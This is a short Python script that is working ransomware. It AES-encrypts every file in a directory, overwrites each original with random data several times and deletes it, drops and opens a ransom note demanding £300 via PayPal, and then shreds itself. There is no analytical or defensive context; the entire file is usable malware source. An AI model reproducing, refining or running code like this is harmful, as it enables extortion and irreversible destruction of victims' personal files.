import os
import subprocess
import secrets
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.backends import default_backend
key = b'0123456789abcdef0123456789abcdef'
message = 'All your personal files have been encrypted - if you ever want to see them again send £300 to CyberCriminal@mail.com on PayPal'
def encrypt_file(filename):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = PKCS7(128).padder()
    with open(filename, 'rb') as infile:
        with open(filename + '.enc', 'wb') as outfile:
            outfile.write(iv)
            while True:
                chunk = infile.read(1024 * 1024)
                if len(chunk) == 0:
                    outfile.write(encryptor.update(padder.finalize()))
                    break
                outfile.write(encryptor.update(padder.update(chunk)))
            outfile.write(encryptor.finalize())
    for _ in range(3):  
        with open(filename, 'wb') as outfile:
            for _ in range(1024 * 1024 // len(key)):  
                outfile.write(secrets.token_bytes(len(key)))
    os.remove(filename)
def encrypt_all_files_in_directory(directory):
    for filename in os.listdir(directory):
        if os.path.isfile(os.path.join(directory, filename)):
            encrypt_file(os.path.join(directory, filename))
def ransom_note(message):
    with open ("URGENT_OPEN.txt", "w") as f:
        f.write(message)
    subprocess.Popen(["xdg-open", "URGENT_OPEN.txt"])
if __name__ == "__main__":
    encrypt_all_files_in_directory('My_Important_Files')
    ransom_note(message)
    for _ in range(3):  
        with open(__file__, 'wb') as f:
            for _ in range(1024 * 1024 // len(key)):  
                f.write(secrets.token_bytes(len(key)))
    os.remove(__file__)
